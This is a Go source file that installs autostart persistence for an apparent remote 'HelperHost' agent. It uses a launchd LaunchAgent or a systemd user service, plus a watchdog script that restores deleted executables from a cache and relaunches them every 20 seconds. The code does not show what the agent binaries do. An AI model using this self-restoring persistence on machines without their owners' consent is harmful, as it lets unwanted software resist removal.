//go:build !windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"syscall"
)

func hideWindow(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
}

func installAutostart() string {
	sh := filepath.Join(dir, "reconnect.sh")
	watchSh := filepath.Join(dir, "watchdog.sh")
	hn := helperFileName()
	en := edgeFileName()
	lock := filepath.Join(dir, "watchdog.lock")

	watch := fmt.Sprintf(`#!/bin/bash
cd %q
LOCK=%q
if [ -f "$LOCK" ]; then
  old=$(cat "$LOCK" 2>/dev/null || true)
  if [ -n "$old" ] && kill -0 "$old" 2>/dev/null; then
    exit 0
  fi
fi
echo $$ > "$LOCK"
trap 'rm -f "$LOCK"' EXIT
while true; do
  if [ ! -x %q ]; then
    if [ -f %q ]; then cp %q %q; chmod +x %q; fi
  fi
  if [ ! -x %q ]; then
    if [ -f %q ]; then cp %q %q; chmod +x %q; fi
  fi
  if ! pgrep -f %q >/dev/null 2>&1; then
    nohup %q >>%q 2>&1 &
  fi
  sleep 20
done
`, dir, lock,
		helperPath, filepath.Join(cacheDir, hn), filepath.Join(cacheDir, hn), helperPath, helperPath,
		edgePath, filepath.Join(cacheDir, en), filepath.Join(cacheDir, en), edgePath, edgePath,
		helperPath, helperPath, logPath)

	_ = os.WriteFile(watchSh, []byte(watch), 0o755)

	reconnect := fmt.Sprintf(`#!/bin/bash
cd %q
for i in $(seq 1 90); do
  curl -fsS --max-time 3 https://cloudflare.com >/dev/null 2>&1 && break
  sleep 2
done
if ! pgrep -f %q >/dev/null 2>&1; then
  nohup /bin/bash %q >/dev/null 2>&1 &
fi
if pgrep -f %q >/dev/null 2>&1; then
  exit 0
fi
exec %q >>%q 2>&1
`, dir, watchSh, watchSh, helperPath, helperPath, logPath)
	_ = os.WriteFile(sh, []byte(reconnect), 0o755)

	if runtime.GOOS == "darwin" {
		home, _ := os.UserHomeDir()
		launch := filepath.Join(home, "Library", "LaunchAgents")
		_ = os.MkdirAll(launch, 0o755)
		label := "com.helperhost.agent"
		plist := filepath.Join(launch, label+".plist")
		content := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>%s</string>
  <key>ProgramArguments</key><array>
    <string>/bin/bash</string><string>%s</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>ThrottleInterval</key><integer>5</integer>
  <key>ProcessType</key><string>Background</string>
  <key>WorkingDirectory</key><string>%s</string>
  <key>StandardOutPath</key><string>%s</string>
  <key>StandardErrorPath</key><string>%s</string>
</dict></plist>
`, label, sh, dir, filepath.Join(dir, "out.log"), filepath.Join(dir, "err.log"))
		_ = os.WriteFile(plist, []byte(content), 0o644)
		uid := os.Getuid()
		_ = exec.Command("launchctl", "bootout", fmt.Sprintf("gui/%d", uid), plist).Run()
		_ = exec.Command("launchctl", "bootstrap", fmt.Sprintf("gui/%d", uid), plist).Run()
		_ = exec.Command("launchctl", "enable", fmt.Sprintf("gui/%d/%s", uid, label)).Run()
		return "launchd"
	}

	home, _ := os.UserHomeDir()
	unitDir := filepath.Join(home, ".config", "systemd", "user")
	_ = os.MkdirAll(unitDir, 0o755)
	unit := filepath.Join(unitDir, "helperhost.service")
	_ = os.WriteFile(unit, []byte(fmt.Sprintf(`[Unit]
Description=HelperHost
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash %s
Restart=always
RestartSec=5
[Install]
WantedBy=default.target
`, sh)), 0o644)
	_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
	_ = exec.Command("systemctl", "--user", "enable", "--now", "helperhost.service").Run()
	return "systemd"
}

func removeAutostart() {
	home, _ := os.UserHomeDir()
	if runtime.GOOS == "darwin" {
		for _, label := range []string{"com.helperhost.agent", "fr.agentshe.pc"} {
			plist := filepath.Join(home, "Library", "LaunchAgents", label+".plist")
			uid := os.Getuid()
			_ = exec.Command("launchctl", "bootout", fmt.Sprintf("gui/%d", uid), plist).Run()
			_ = exec.Command("launchctl", "unload", plist).Run()
			_ = os.Remove(plist)
		}
		return
	}
	for _, svc := range []string{"helperhost.service", "agentshe.service"} {
		_ = exec.Command("systemctl", "--user", "disable", "--now", svc).Run()
		_ = os.Remove(filepath.Join(home, ".config", "systemd", "user", svc))
	}
	_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
}
